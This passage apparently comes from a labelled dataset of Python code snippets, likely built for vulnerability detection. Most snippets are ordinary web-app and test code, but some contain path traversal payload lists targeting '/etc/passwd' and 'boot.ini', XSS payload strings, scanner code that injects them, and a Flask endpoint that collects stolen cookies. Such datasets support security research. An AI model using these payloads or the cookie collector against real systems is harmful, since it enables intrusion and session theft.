run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to", "label": 0}, {"snippet_id": 14976, "code": "', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command", "label": 0}, {"snippet_id": 41509, "code": ".comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar", "label": 0}, {"snippet_id": 7614, "code": "<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index'", "label": 1}, {"snippet_id": 11818, "code": "\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view", "label": 0}, {"snippet_id": 25501, "code": ".clean(value) if self.one_required and(not value or not any(v for v in value)): raise forms.ValidationError(self.error_messages['required'], code='required') if self.require_all_fields and not all(v for v", "label": 0}, {"snippet_id": 26489, "code": "%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e", "label": 0}, {"snippet_id": 42532, "code": "=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values", "label": 0}, {"snippet_id": 19020, "code": "'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/',", "label": 0}, {"snippet_id": 49626, "code": ", start=1) ] if self.list_filter else[] def get_columns(self): \"\"\" Transform list_display into list of SmartColumns In list_display we expect: 1. name of the field(string) or 2. two element iterable in", "label": 0}, {"snippet_id": 7179, "code": ", name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id", "label": 0}, {"snippet_id": 30292, "code": "+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass)) \t if serv is not None and act==\"stats\": \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting(", "label": 0}, {"snippet_id": 11532, "code": ", name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$'", "label": 0}, {"snippet_id": 34082, "code": ".get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\")", "label": 0}, {"snippet_id": 10989, "code": "--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok", "label": 0}, {"snippet_id": 48722, "code": "[\"rid\"])) +\\ '&srid=' +str(int(request.GET['srid']))) else: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"]))) else: return HttpResponseRedirect(\"/admin?error=Missing", "label": 0}, {"snippet_id": 38640, "code": " in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument", "label": 0}, {"snippet_id": 27278, "code": ") else: print \"[-] Can't get host information\" exit() print \"[+] Host acquired \" +host print \"[+] Retrieve page\" try: r=requests.get(url) s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as", "label": 0}, {"snippet_id": 48187, "code": "(request) handle_file(user, headline, category, text, file) except Exception as e: return redirect(\"/admin/media/add?hint=\" +str(e)) return redirect(\"/admin/media/add\") def action_add_multiple_media(request", "label": 0}, {"snippet_id": 11958, "code": " include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/',", "label": 0}, {"snippet_id": 48503, "code": " !=u and u. rights < 2: return HttpResponseRedirect(\"/admin?error=noyb\") current_reservation.submitted=True current_reservation.save() res: HttpResponseRedirect=HttpResponseRedirect(forward_url) return", "label": 0}, {"snippet_id": 13251, "code": "'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$", "label": 0}, {"snippet_id": 18969, "code": "<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 41893, "code": ", value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self", "label": 0}, {"snippet_id": 28714, "code": " \tlevel=kwargs.get(\"level\") \t\t \tif level is None: \t\tlevel=1 \t\t \ttry: \t\treturn True if role <=level else False \texcept: \t\treturn False \t\tpass def page_for_admin(**kwargs): \tgive_level=1 \tgive_level=kwargs", "label": 0}, {"snippet_id": 54594, "code": "() return super().form_valid(form) class ArticlesList(ListView): \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles' template_name='index.html' paginate_by=5 def get_queryset(self, **kwargs):", "label": 0}, {"snippet_id": 52402, "code": " subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout': layout})", "label": 0}, {"snippet_id": 1603, "code": " ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify", "label": 0}, {"snippet_id": 28787, "code": ".select_ssh(serv=serv): \t\tssh_enable=sshs[3] \t\tssh_user_name=sshs[4] \t\tssh_user_password=sshs[5] \t\tssh_key_name=fullpath+'/keys/%s.pem' % sshs[2] \tservers=sql.select_servers(server=serv) \tfor server in servers:", "label": 0}, {"snippet_id": 35067, "code": "\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t", "label": 0}, {"snippet_id": 48483, "code": ": forward_url=request.GET[\"redirect\"] if \"payload\" not in request.GET: return HttpResponseRedirect(\"/admin?error=No%20id%20provided\") current_reservation=GroupReservation.objects.get(id=int(request.GET", "label": 0}, {"snippet_id": 47709, "code": "-popup\">' a +=f.render_html(http_request) a +=\"</div>\" return a def check_password_conformity(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper(): return False", "label": 0}, {"snippet_id": 104, "code": " in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request", "label": 0}, {"snippet_id": 16489, "code": " settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create", "label": 0}, {"snippet_id": 13914, "code": "='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',", "label": 0}, {"snippet_id": 1273, "code": " scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append", "label": 0}, {"snippet_id": 34619, "code": "(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor", "label": 0}, {"snippet_id": 20364, "code": "=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler", "label": 0}, {"snippet_id": 14478, "code": ", include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON", "label": 0}, {"snippet_id": 27753, "code": "]='application/json' self.before_render_json(values, status) self.response.out.write(json.dumps(values, cls=JsonEncoder)) self.response.set_status(status) def handle_exception(self, exception, _): \"\"\"Catch", "label": 0}, {"snippet_id": 20865, "code": "\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^", "label": 0}, {"snippet_id": 20025, "code": ".__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\")", "label": 0}, {"snippet_id": 53046, "code": "'status': -1} coordinator_data=json.loads(request.POST.get('coordinator', '{}')) if coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2", "label": 0}, {"snippet_id": 36694, "code": ",)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname", "label": 0}, {"snippet_id": 42922, "code": "\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname", "label": 0}, {"snippet_id": 44823, "code": ".do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2) if node_data['type'] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']==", "label": 0}, {"snippet_id": 16510, "code": "', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),", "label": 0}, {"snippet_id": 1189, "code": "',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST']) def start_scan(): scanid=generate_hash() content", "label": 0}, {"snippet_id": 6883, "code": ".config.get(self.section, 'default_scoped_affiliation') @property def vccs_url(self): \"\"\" URL to use with VCCS client. BCP is to have an nginx or similar on localhost that will proxy requests to a currently", "label": 0}, {"snippet_id": 37255, "code": "\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] ", "label": 0}, {"snippet_id": 51502, "code": " pass MIDDLEWARE=[ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.locale.LocaleMiddleware', 'django.middleware.common.CommonMiddleware", "label": 0}, {"snippet_id": 884, "code": "['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=[", "label": 1}, {"snippet_id": 26816, "code": "%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini", "label": 0}, {"snippet_id": 20427, "code": "\"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=", "label": 0}, {"snippet_id": 41532, "code": ".avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar", "label": 0}, {"snippet_id": 31092, "code": ".getvalue('slaveadd') \tinterface=form.getvalue('interfaceadd') \tvrrpip=form.getvalue('vrrpipadd') \tkp=form.getvalue('kp') \ttmp_config_path=sql.get_setting('tmp_config_path') \tscript=\"add_vrrp.sh\" \t \tos.system", "label": 0}, {"snippet_id": 53865, "code": "',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---", "label": 0}, {"snippet_id": 53262, "code": "): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy() properties={'wf_application_path", "label": 0}, {"snippet_id": 39062, "code": "\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance", "label": 0}, {"snippet_id": 47204, "code": " record_adminview model=record_adminview.pop('model') view=record_adminview.pop('modelview') admin.add_view(view(model, db.session, **record_adminview)) menu_items={str(item.name): item for item in admin.menu(", "label": 0}, {"snippet_id": 44651, "code": "{'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows", "label": 0}, {"snippet_id": 6506, "code": " this value, plus the pysaml2 lifetime of the assertion. \"\"\" return self.config.getint(self.section, 'sso_session_lifetime') @property def sso_session_mongo_uri(self): \"\"\" SSO session MongoDB connection", "label": 0}, {"snippet_id": 30323, "code": "/%s' %(serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) \texcept requests.exceptions.ConnectTimeout: \t\tprint('Oops. Connection timeout occured!') \texcept requests.exceptions.ReadTimeout", "label": 0}, {"snippet_id": 34187, "code": "(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \"", "label": 0}, {"snippet_id": 31045, "code": "\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip]", "label": 0}, {"snippet_id": 42553, "code": ") +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e):", "label": 0}, {"snippet_id": 36040, "code": " \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True", "label": 0}, {"snippet_id": 50480, "code": " mode_close(self, request): \"\"\" This is called by render_POST when the client is signalling that it is about to be closed. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid", "label": 0}, {"snippet_id": 25160, "code": " django.core.exceptions import ValidationError from django.utils.safestring import mark_safe from django.utils.translation import ugettext_lazy as _ from pretix.base.forms.widgets import( BusinessBooleanRadio", "label": 0}, {"snippet_id": 25606, "code": ".attendee_names_asked: self.fields['attendee_name_parts']=NamePartsFormField( max_length=255, required=event.settings.attendee_names_required, scheme=event.settings.name_scheme, label=_('Attendee name'), initial", "label": 0}, {"snippet_id": 53504, "code": "(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory", "label": 0}, {"snippet_id": 46127, "code": " 'engines': get_engines(request.user) }), 'is_owner': collection_doc.doc.get().can_write(request.user), 'can_edit_index': can_edit_index(request.user), 'is_embeddable': request.GET.get('is_embeddable',", "label": 1}, {"snippet_id": 3645, "code": ",headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url", "label": 0}, {"snippet_id": 44782, "code": "(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get", "label": 0}, {"snippet_id": 33363, "code": "', expiration.CronExpireBuilds), webapp2.Route(r'/internal/cron/buildbucket/delete_builds', expiration.CronDeleteBuilds), webapp2.Route(r'/internal/cron/buildbucket/update_buckets', CronUpdateBuckets),", "label": 0}, {"snippet_id": 43038, "code": " \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test", "label": 0}, {"snippet_id": 36323, "code": ".print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format", "label": 0}, {"snippet_id": 40026, "code": " \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname", "label": 0}, {"snippet_id": 39239, "code": "\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key)", "label": 0}, {"snippet_id": 13636, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\")", "label": 0}, {"snippet_id": 14539, "code": "\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler", "label": 0}, {"snippet_id": 46352, "code": "'is_embeddable', False), 'can_edit_index': can_edit_index(request.user), 'mobile': is_mobile }) def browse_m(request, name): return browse(request, name, True) @allow_owner_only def save(request): response=", "label": 0}, {"snippet_id": 1140, "code": " json import sys import hashlib import time sys.path.append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from", "label": 1}, {"snippet_id": 54428, "code": ", column=2, sticky=W, pady=4) Button(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4) Label(main, text=\"\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap", "label": 0}, {"snippet_id": 9466, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort", "label": 0}, {"snippet_id": 10, "code": " import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list", "label": 0}, {"snippet_id": 9101, "code": ".course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$", "label": 1}, {"snippet_id": 42268, "code": "\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns", "label": 0}, {"snippet_id": 40513, "code": " parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df", "label": 0}, {"snippet_id": 7294, "code": ".html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url", "label": 0}, {"snippet_id": 27729, "code": " before_render_json(self, values, status): \"\"\"A hook for modifying values before render_json.\"\"\" def render_json(self, values, status=200): \"\"\"Write JSON response.\"\"\" self._add_security_response_headers()", "label": 0}, {"snippet_id": 51571, "code": ", 'django.contrib.messages.context_processors.messages', ], }, }, ] WSGI_APPLICATION='dashboard.wsgi.application' DATABASE_OPTIONS={ 'mysql':{'init_command': \"SET character_set_connection=utf8,\" \"collation_connection", "label": 0}, {"snippet_id": 50638, "code": "): This is a django-specific internal representation of the browser session. \"\"\" if self.csessid: return _CLIENT_SESSIONS(session_key=self.csessid) def disconnect(self, reason=\"Server disconnected.\"): ", "label": 0}, {"snippet_id": 5776, "code": "\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel=\"import\" href", "label": 0}, {"snippet_id": 46863, "code": " self.content if not content: return '' return markdown(content) async def clear_mc(self): for key in(MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST): await clear_mc(key % self.post_id) @property async def user", "label": 1}, {"snippet_id": 871, "code": ")) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact", "label": 1}, {"snippet_id": 34228, "code": ") \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta", "label": 0}, {"snippet_id": 44072, "code": "(**kwargs) class ProjectSearch(RTDFacetedSearch): fields=['name^5', 'description'] facets={ 'language': TermsFacet(field='language') } class FileSearch(RTDFacetedSearch): facets={ 'project': TermsFacet", "label": 0}, {"snippet_id": 15376, "code": " None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p()", "label": 0}, {"snippet_id": 26103, "code": ".fields['company'].required=True self.fields['company'].widget.is_required=True self.fields['company'].widget.attrs['required']='required' del self.fields['company'].widget.attrs['data-display-dependency']", "label": 0}, {"snippet_id": 45969, "code": "\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}, {\"widgets\":[ {\"size\":12,\"name\":\"Grid Results", "label": 0}, {"snippet_id": 24038, "code": " num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate", "label": 0}, {"snippet_id": 42351, "code": "[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self", "label": 0}, {"snippet_id": 47148, "code": "() db.session.commit() except SQLAlchemyError as e: if not self.handle_view_exception(e): flash(_('Failed to delete record. %(error)s', error=str(e)), category='error') db.session.rollback() return False", "label": 0}, {"snippet_id": 34355, "code": "(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict", "label": 0}, {"snippet_id": 48495, "code": "%20id%20provided\") current_reservation=GroupReservation.objects.get(id=int(request.GET[\"payload\"])) if current_reservation.createdByUser !=u and u. rights < 2: return HttpResponseRedirect(\"/admin?error", "label": 0}, {"snippet_id": 7974, "code": ".users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 44329, "code": ".fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data", "label": 1}, {"snippet_id": 31612, "code": "\t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@conn\"), \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv]", "label": 0}, {"snippet_id": 4170, "code": ".replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !", "label": 0}, {"snippet_id": 19774, "code": " various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests", "label": 0}, {"snippet_id": 17819, "code": "': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$", "label": 0}, {"snippet_id": 47332, "code": " User from. import page_skeleton, magic from.form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum from..models import Profile, Media from..uitools", "label": 0}, {"snippet_id": 43648, "code": " fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields", "label": 0}, {"snippet_id": 13422, "code": " is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url", "label": 0}, {"snippet_id": 19696, "code": " Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils", "label": 0}, {"snippet_id": 50466, "code": " request) if csessid in self.requests: self.requests[csessid].finish() self.requests[csessid]=request return server.NOT_DONE_YET def mode_close(self, request): \"\"\" This is called by render_POST when the", "label": 0}, {"snippet_id": 2064, "code": " decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer", "label": 0}, {"snippet_id": 25421, "code": "', None), } self.scheme_name=kwargs.pop('scheme') self.scheme=PERSON_NAME_SCHEMES.get(self.scheme_name) self.one_required=kwargs.get('required', True) require_all_fields=kwargs.pop('require_all_fields'", "label": 0}, {"snippet_id": 28666, "code": "(user_uuid.value) \t\tif sql.get_user_name_by_uuid(user_uuid.value) is None: \t\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \telse: \t\tprint('<meta http-equiv=\"refresh\" content=", "label": 0}, {"snippet_id": 12939, "code": 